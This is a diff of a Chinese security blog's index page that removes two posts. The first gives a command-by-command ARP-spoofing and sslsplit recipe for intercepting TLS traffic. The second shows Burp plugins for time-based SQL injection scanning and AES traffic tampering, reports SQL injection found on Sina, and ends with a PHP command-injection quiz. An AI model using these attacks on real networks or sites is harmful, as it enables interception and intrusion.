-        <a href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="数据流量重定向"><a href="#数据流量重定向" class="headerlink" title="数据流量重定向"></a>数据流量重定向</h2><ul>
-<li>使用ARP欺骗。发送假的网关(gateway)的MAC地址（其实是攻击者的MAC地址) 给受害者, 让受害者误以为 攻击者就是网关。你不需要物理访问受害者的设备就能做到。</li>
-<li>手动改变 受害者的 默认网关。如果你能物理访问受害者设备，这是最简单的方法</li>
-<li>DNS欺骗。 对特定的域名，返回攻击者的IP作为目标服务器的地址 给受害者。</li>
-<li>修改受害者机器的/etc/hosts的条目来 转向某些域名的流量</li>
-</ul>
-<h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><ol>
-<li>环境：</li>
-</ol>
-<ul>
-<li>攻击者ip:192.168.31.200 操作主机</li>
-<li>网关：192.168.31.1 路由器</li>
-<li>受害者：192.168.31.224 手机或电脑</li>
-</ul>
-<ol>
-<li>开启ip转发</li>
-</ol>
-<p><code>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</code></p>
-<ol>
-<li>生成CA证书  </li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">openssl genrsa -out ca.key 4096</div><div class="line">openssl req -new -x509 -days 1826 -key ca.key -out ca.crt</div></pre></td></tr></table></figure>
-<ul>
-<li>第1个命令，生成 4096位的RSA私钥（以pem格式保存) ca.key</li>
-<li>第2个命令， 使用这个刚生成的私钥，来生成一个 自签名的 root CA 证书(ca.crt)</li>
-</ul>
-<p>这两个文件在后面都会用到。只有ca.crt这个证书文件，需要安装 到浏览器，或者受害者的机器上。</p>
-<ol>
-<li>端口流量转发</li>
-</ol>
-<p>用iptables进行流量转发，需要把我们需要的端口进行转发</p>
-<blockquote>
-<p>8080用作非SSL的TCP连接，比如 http, smtp, ftp<br>8443 用作SSL的连接，比如SMTP over SSL, HTTPS等</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sysctl -w net.ipv4.ip_forward=1</div><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443</div></pre></td></tr></table></figure>
-<ol>
-<li>ARP欺骗</li>
-</ol>
-<p><code>ettercap -T -q -M ARP //192.168.31.224/ //192.168.31.1/</code></p>
-<p><code>arpspoof -i eth0 -t 192.168.31.1 192.168.31.224</code></p>
-<ol>
-<li>直接建立热点</li>
-</ol>
-<p>kali下可以直接建立热点，需要打开iptables的nat功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE #对eth0进行源nat</div><div class="line">iptables -A FORWARD -i wlan1 -o eth0 -j ACCEPT #把无线网卡流量转发到有线网卡（或者什么能上网的网卡）上面</div><div class="line">iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356 #修改最大报文段长度</div></pre></td></tr></table></figure></p>
-<ol>
-<li>使用SSLsplit进行</li>
-</ol>
-<p><code>sslsplit -D -l connect.log -j /opt/sslsplit/test1 -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></p>
-<ol>
-<li>使用starttls-mitm进行(<a href="https://github.com/adrain09/starttls-mitm" target="_blank" rel="external">https://github.com/adrain09/starttls-mitm</a>)</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/安全测试/中间人攻击获取ssl-tsl数据/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
-    <article id="post-安全测试/brupsuite/基于burp插件的安全测试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/">基于burp插件的安全测试</a>
-    </h1>
-  
-
-        <a href="/2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/" class="archive-article-date">
-  	<time datetime="2016-12-16T03:12:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2016-12-16</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="基于burp插件的安全测试"><a href="#基于burp插件的安全测试" class="headerlink" title="基于burp插件的安全测试"></a>基于burp插件的安全测试</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>burp是很多web安全爱好者都会用到的神器，burp专业版集成了代理、fuzzing、重放、扫描等功能，对于自动化扫描功能来说，里面的poc都是官方集成好的，很难增加自己的特殊poc代码，最新版开放了burp的开发api，利用api可以很简单的集成自己的扫描poc，针对特定的站点进行针对性的扫描</p>
-<p>相对于其他扫描器，基于burp的自动化扫描可以不用考虑登入、cookie的处理问题，以及不用考虑爬虫爬不到的链接，只要你点击站点所有的页面后，burp的代理功能都会记录下请求来，设置不用考虑poc的插入位置问题，burp默认会对所有的位置进行poc的插入测试，连url里面的path路径都会涉及到。</p>
-<h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><p>burp在extender标签中，可以增加自己的插件代码，支持python、ruby、java，在测试中发现，java的效率是最高的，并且开发起来，在ide中导入jar包很容易开发，比起python、ruby还需要第三方插件的支持，并且效率比起java还是比较慢</p>
-<p>在BAPP Store中有很多开发好的插件代码，可以下载下来，安装后，在指定的目录下面会有相应的python代码或者jar包存在，这些都是很好的学习代码，推荐几个比较好用的插件：</p>
-<p>JSON Decoder，可以将json数据格式化，比较方便查看。</p>
-<p>Active Scan++ 增加了一些本身自动化扫描没有的漏洞检查。</p>
-<p>在APIs中是burp提供的api接口，自己没有接触过java代码，看起来比较费劲，可以先不用管他，可以在编写插件的时候了解到怎么使用和功能等等。</p>
-<p>下面的save，可以将这些api文件保存起来，后面编写java代码直接调用相应的接口</p>
-<p>Options里面是一些设置，主要是设置一些运行环境，比如你想用python写插件的话，就需要安装jython第三方包了</p>
-<h4 id="sql注入插件开发"><a href="#sql注入插件开发" class="headerlink" title="sql注入插件开发"></a>sql注入插件开发</h4><p>开发插件使用的是IDEA，创建一个新工程，创建一个新的package，注意这里命名为burp，将我们下载好的api包导入这个package中，后面需要创建插件的主要代码程序，这里还需要注意，这个代码文件的命名需要是BurpExtender，这个是必须的。</p>
-<p>这里我们做一个基于时间延时的sql注入扫描，sqlmap里面也有，但是sqlmap跑起来太慢，burp的自动化扫描，针对时间的sql注入扫描并不是很好用，poc比较少。</p>
-<p>由于我们这个插件主要做的就是把参数后面增加poc或者替换参数值为poc再去访问，判断执行时间是否有延时</p>
-<p>看了Active Scan++的源码，在IScannerCheck接口中有自动化的扫描函数：doActiveScan，并且会自动化的把poc插入到每一个测试点中，我们做的就是把poc给他，然后访问，看访问执行到访问结束的时间</p>
-<p>给出简单代码：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BurpExtender</span> <span class="keyword">implements</span> <span class="title">IBurpExtender</span>, <span class="title">IScannerCheck</span></span>&#123;</div><div class="line">  <span class="comment">//实现IScannerCheck的doActiveScan</span></div><div class="line">  <span class="comment">// 实现IBurpExtender的registerExtenderCallbacks，来注册插件</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span></span>&#123;</div><div class="line">      <span class="comment">//注册插件，使burp可以加载到我们的插件</span></div><div class="line">      payloads[xxx]=<span class="string">"*if(now()=sysdate() and 1=1,SLEEP(10),0)"</span>;</div><div class="line">      <span class="comment">//自己的payload列表，将自己的注入poc写在这里</span></div><div class="line">        <span class="keyword">this</span>.mcallbacks = callbacks;</div><div class="line">        stdout = <span class="keyword">new</span> PrintWriter(callbacks.getStdout(), <span class="keyword">true</span>);</div><div class="line">        helpers = callbacks.getHelpers();</div><div class="line">        <span class="comment">//helpers非常有用，可以帮你处理很多东西，这个后续需要好好研究下</span></div><div class="line">        callbacks.setExtensionName(<span class="string">"FuckScan"</span>);</div><div class="line">        callbacks.registerScannerCheck(<span class="keyword">this</span>);</div><div class="line">    &#125;</div><div class="line">  <span class="comment">// 上述代码就可以将自己的插件增加到burp里面了</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> List&lt;IScanIssue&gt; <span class="title">doActiveScan</span><span class="params">(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint)</span> </span>&#123;</div><div class="line">      <span class="comment">// 这里重写doActiveScan，在自动话扫描的时候增加我们的扫描代码</span></div><div class="line">      <span class="comment">// baseRequestResponse 是IHttpRequestResponse类型，这个里面包含了当前请求的所有信息，包括request和response信息</span></div><div class="line">      <span class="comment">// insertionPoint 是插入点，里面可以自动设置只在哪个位置进行插入测试，测试过程中发现代码有问题，只好全部扫描了</span></div><div class="line">      String value = insertionPoint.getBaseValue(); <span class="comment">//这个是先取下插入点的参数值，有的poc需要的是增加在原有的参数值后面生效的</span></div><div class="line">      SqlScanner(baseRequestResponse,insertionPoint,value);<span class="comment">//将当前的页面信息，插入点，和原有参数值传递到sql注入扫描中</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SqlScanner</span><span class="params">(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint,String value)</span></span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(payload.contains(<span class="string">"*"</span>))&#123;<span class="comment">//在poc中进行设置，主要出现×的就直接用poc测试，没有出现的用原有值增加poc测试</span></div><div class="line">            payload_byte = payload.getBytes();<span class="comment">//这里注意所有的操作，都是基于byte类型基础上的，需要进行转化处理</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            payload_byte = (value + payload).getBytes();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">byte</span>[] checkRequest = insertionPoint.buildRequest(payload_byte);<span class="comment">//这里是创建新的request，主要是将poc加入的重新生成一个request</span></div><div class="line"></div><div class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();<span class="comment">//记录当前时间</span></div><div class="line"></div><div class="line">        IHttpRequestResponse checkqeuestResponse = <span class="keyword">this</span>.mcallbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest);</div><div class="line">        <span class="comment">// 这个是带poc去请求，我不管正常的请求时间，只需要知道这个request运行了多少时间</span></div><div class="line">        <span class="comment">// getHttpService，返回的是包含现在所有http服务请求的object</span></div><div class="line">        <span class="comment">// makeHttpRequest 是使用checkRequest并重新请求获取服务器的响应</span></div><div class="line">        <span class="comment">//为了减少误报，这里采用了两次请求的方法，结果比一次好些</span></div><div class="line">        <span class="comment">// <span class="doctag">TODO:</span>需要判断下原请求的时间，过程中还是发现不少误报</span></div><div class="line"></div><div class="line">        <span class="keyword">long</span> end = System.currentTimeMillis();<span class="comment">//记录请求结束时间</span></div><div class="line">        <span class="keyword">if</span> (runtime &gt; <span class="number">9000</span>)&#123;<span class="comment">//poc中做的都是延时10秒，若有sql注入时间会出现比较大的延时</span></div><div class="line">          stdout.println(<span class="string">"[SQL注入成功:]"</span>);</div><div class="line">          stdout.println(helpers.bytesToString(checkRequest));<span class="comment">//在log中打印此次请求的request</span></div><div class="line">          <span class="comment">//<span class="doctag">TODO:</span>后续利用IScanIssue增加到burp的扫描结果中</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>这就是基于time延时的扫描插件，很简单的几行代码就能结合burp本身的优势将我们的poc增加到自动化扫描里面</p>
-<p>我自己结合cloudeye增加了命令执行的检查，简单的用curl，将当前有命令执行的请求传递到cloudeye的日志里面，测试过程中发现见有几个产生了dns请求，没有执行curl，没有访问日志</p>
-<h4 id="AES加解密插件开发"><a href="#AES加解密插件开发" class="headerlink" title="AES加解密插件开发"></a>AES加解密插件开发</h4><p>在测试的过程中还需要一个问题，很多android在数据传输的时候对数据进行了加密处理，在测试的时候没有办法增加自己的poc来对进行测试，但是反编译app能发现AES的私钥硬编码在app中<br>这样可以在流量通过burp的时候对流量进行解密再增加poc再加密发送出去进行测试</p>
-<p>这个大牛们写过这方面的文章，自己也是在参考他们的基础上完成的。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BurpExtender</span> <span class="keyword">implements</span> <span class="title">IBurpExtender</span>, <span class="title">IHttpListener</span>, <span class="title">IMessageEditorTabFactory</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//初始化使用的对象</span></div><div class="line">    <span class="keyword">private</span> IBurpExtenderCallbacks callbacks;</div><div class="line">    <span class="keyword">private</span> IExtensionHelpers helpers;</div><div class="line">    <span class="keyword">private</span> PrintWriter stdout;</div><div class="line">    <span class="keyword">private</span> String skey = <span class="string">"FL5LCBJL3JN534JC"</span>; <span class="comment">//AES私钥</span></div><div class="line">    <span class="keyword">private</span> String IV = <span class="string">"E68CFL7BK8KCCG6N"</span>;<span class="comment">//AES IV</span></div><div class="line"></div><div class="line">    <span class="comment">//注册插件</span></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">registerExtenderCallbacks</span><span class="params">(IBurpExtenderCallbacks callbacks)</span> </span>&#123;</div><div class="line">        stdout = <span class="keyword">new</span> PrintWriter(callbacks.getStdout(), <span class="keyword">true</span>);</div><div class="line">        <span class="keyword">this</span>.callbacks = callbacks;</div><div class="line">        helpers = callbacks.getHelpers();</div><div class="line">        callbacks.setExtensionName(<span class="string">"AES encrypt java edition"</span>);</div><div class="line">        callbacks.registerHttpListener(<span class="keyword">this</span>);<span class="comment">//为下面的processHttpMessage 注册,否则下面的方法不能使用</span></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processHttpMessage</span><span class="params">(<span class="keyword">int</span> toolFlag, <span class="keyword">boolean</span> messageIsRequest, IHttpRequestResponse messageInfo)</span> </span>&#123;</div><div class="line">      <span class="comment">//这个是对IHttpListener的方法改写，The listener will be notified of requests and responses made by any Burp tool.</span></div><div class="line">      <span class="comment">// toolFlag 是来定义那些请求是需要进行处理的。不同的参数值代表burp的不同位置</span></div><div class="line">      <span class="comment">// messageIsRequest 消息是否是请求包</span></div><div class="line">      <span class="comment">// messageInfo 包内容</span></div><div class="line">      <span class="keyword">if</span> (toolFlag == <span class="number">64</span> || toolFlag == <span class="number">16</span> || toolFlag == <span class="number">32</span> || toolFlag == <span class="number">4</span>) &#123;</div><div class="line">      <span class="comment">//不同的toolflag代表不同的burp组件,16:scanner;64:repeater;32:interuder;4:proxy</span></div><div class="line">      <span class="comment">//详情查看:https://portswigger.net/burp/extender/api/constant-values.html#burp.IBurpExtenderCallbacks</span></div><div class="line">      <span class="keyword">if</span> (messageIsRequest) &#123;<span class="comment">//请求包</span></div><div class="line">          IRequestInfo analyzeRequest = helpers.analyzeRequest(messageInfo);<span class="comment">//利用helper自动处理请求包</span></div><div class="line">          List&lt;String&gt; headers = analyzeRequest.getHeaders();<span class="comment">//获取请求头列表</span></div><div class="line">          List&lt;IParameter&gt; paraList = analyzeRequest.getParameters();<span class="comment">//获取参数列表,参数分为三类:URL\COOKIE\BODY</span></div><div class="line">          <span class="keyword">byte</span>[] new_Request = messageInfo.getRequest();</div><div class="line">          <span class="keyword">for</span> (IParameter para : paraList) &#123;<span class="comment">//循环获取参数,判断类型,进行加密处理后,再构造新的参数,合并到请求包中</span></div><div class="line">            <span class="keyword">if</span> ((para.getType() == <span class="number">0</span> || para.getType() == <span class="number">1</span>) &amp;&amp; !paraWhiteList.contains(para.getName())) &#123;<span class="comment">//通过type来判断参数位于那个位置,</span></div><div class="line">                <span class="comment">// cookie是不需要处理的</span></div><div class="line">                String key = para.getName();</div><div class="line">                String value = para.getValue();</div><div class="line">                aesvalue = aes.encrypt(skey, IV, value);</div><div class="line">                aesvalue = helpers.urlEncode(aesvalue);</div><div class="line"><span class="comment">//                                    aesvalue = URLEncoder.encode(aesvalue, "UTF-8");//进行url编码</span></div><div class="line"><span class="comment">//                                    stdout.println("[ENCODE:]" + key + ":" + value + ":" + aesvalue); //输出到extender的UI窗口</span></div><div class="line">                IParameter newPara = helpers.buildParameter(key, aesvalue, para.getType());<span class="comment">//构造新的请求参数</span></div><div class="line">                new_Request = helpers.updateParameter(new_Request, newPara);<span class="comment">//构造新的请求包</span></div><div class="line">                messageInfo.setRequest(new_Request);<span class="comment">//设置最新的请求包</span></div><div class="line">              &#125;</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">          <span class="keyword">else</span> &#123;<span class="comment">//处理返回的响应包，就是把返回的响应进行解密后展示出来，设计到几个api中的函数，看名称应该知道什么意思了</span></div><div class="line">              IResponseInfo anaylyzeResponse = helpers.analyzeResponse(messageInfo.getResponse());</div><div class="line">              List&lt;String&gt; header = anaylyzeResponse.getHeaders();</div><div class="line">              <span class="keyword">short</span> statusCode = anaylyzeResponse.getStatusCode();</div><div class="line">              <span class="keyword">int</span> badyOffset = anaylyzeResponse.getBodyOffset();</div><div class="line">              AESOperator aes = <span class="keyword">new</span> AESOperator();</div><div class="line">              String resp = <span class="keyword">new</span> String(messageInfo.getResponse());</div><div class="line">              String body = resp.substring(badyOffset);</div><div class="line">              String debody = aes.decrypt(skey, IV, body);</div><div class="line">              debody = debody.replace(<span class="string">"\""</span>, <span class="string">"\\\""</span>);</div><div class="line">              String UnicodeBody = (<span class="keyword">new</span> CharSetUtil()).decodeUnicode(debody);</div><div class="line">              String newBody = UnicodeBody;</div><div class="line">              <span class="keyword">byte</span>[] bodybyte = newBody.getBytes();</div><div class="line">              messageInfo.setResponse(helpers.buildHttpMessage(header, bodybyte));</div></pre></td></tr></table></figure>
-<p>这个AES的加解密插件只要针对不同的加密密钥更改就行，可以很方面的解密出app中传递的参数，有的app还有增加sign校验值，只要反编译app获取算法后一样可以增加到插件中，这样就能对加密和增加校验值的进行web测试了</p>
-<h4 id="插件扫描结果"><a href="#插件扫描结果" class="headerlink" title="插件扫描结果"></a>插件扫描结果</h4><p>在测试新浪的服务的时候，直接打开自动扫描，可以把burp内置的扫描关闭掉，这样速度还是可以的，只要浏览sina的页面，插件自动进行扫描，结果发现sina的两处sql注入问题，这个要感谢川神的支持</p>
-<p><img src="基于burp插件的安全测试/1.png" alt="sql注入"><br><img src="基于burp插件的安全测试/2.png" alt="sql注入"></p>
-<p>当然测试中针对不同的网站特定进行手工的测试，总结出通用的poc之后加入到插件中去，直接在访问页面的时候就可以发现漏洞了</p>
-<p>AES加解密的插件，利用起来可以查看一个乌云的一个案例<a href="http://www.2cto.com/Article/201607/528201.html" target="_blank" rel="external">Zealer_android客户端安全检测</a></p>
-<h4 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h4><ol>
-<li><p>学习java代码，优化插件</p>
-</li>
-<li><p>增加更多的扫描插件，需要更对测试，获取每个网站业务特定漏洞poc，后续可以集成到自己的一个插件框架下面，在burp下面增加可以增加poc的输入框。</p>
-</li>
-</ol>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>自己在java方面算是入门级别，这些也都是是参考各位大牛的基础上写的，过程中感觉很大一部分简单的知道java调用就行，主要是api的使用，当然会java的应该会编写出更加牛叉的测试插件，burp是个神器，在神器作为平台开发插件可以介绍很多工作量和避免很多坑。</p>
-<p>有很多的神器都是提供插件的集成的，网页浏览chrome本身就是一个框架，可以自己写chrome插件，端口扫描神器nmap也可以自定义插件扫描，移动安全方面，android hook方面有xposed框架，应用安全检测方面有drozer框架，自己开发插件集成可以玩出很多花样。</p>
-<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>以下代码可能存在什么问题？</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	extract($_POST);</div><div class="line"></div><div class="line">	<span class="comment">// 輸入淨化</span></div><div class="line">	<span class="keyword">if</span> (!mb_detect_encoding($p1, <span class="string">'UTF-8'</span>, <span class="keyword">true</span>) &amp;&amp; !mb_detect_encoding($p1, <span class="string">'big5'</span>, <span class="keyword">true</span>)) &#123;</div><div class="line">	    <span class="keyword">die</span>(<span class="string">"funny how a melody sounds like a memory"</span>);</div><div class="line">	&#125;</div><div class="line">	$p1 = mb_ereg_replace(<span class="string">"\\\\"</span>, <span class="string">"\\\\"</span>, $p1);</div><div class="line">	$p1 = mb_ereg_replace(<span class="string">"\""</span>,<span class="string">"\\\""</span>, $p1);</div><div class="line">	$p1 = mb_ereg_replace(<span class="string">"\\$"</span>, <span class="string">"\\$"</span>, $p1);</div><div class="line">	$p1 = mb_ereg_replace(<span class="string">"`"</span>, <span class="string">"\\`"</span>, $p1);</div><div class="line"></div><div class="line">	<span class="comment">// 記錄日誌</span></div><div class="line">	exec_sql(<span class="string">"INSERT INTO iface_log (content, data) VALUES(?, ?)"</span>, <span class="string">"ss"</span>, <span class="string">"Remote interface called"</span>, json_encode(<span class="keyword">array</span>(<span class="string">'p1'</span>=&gt;$p1, <span class="string">'p2'</span>=&gt;$p2)));</div><div class="line"></div><div class="line">	<span class="comment">// 執行轉換</span></div><div class="line">	system(<span class="string">"timeout 2 /scripts/convert.sh reverse \"$p1\""</span>);</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全测试/">安全测试</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2016/12/16/安全测试/brupsuite/基于burp插件的安全测试/">展开全文 >></a>
         </p>
       
 
@@ -1239,15 +1363,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">移动安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">web安全</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)">安全测试</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">移动安全</a>
               </li>
             
             <div class="clearfix"></div>
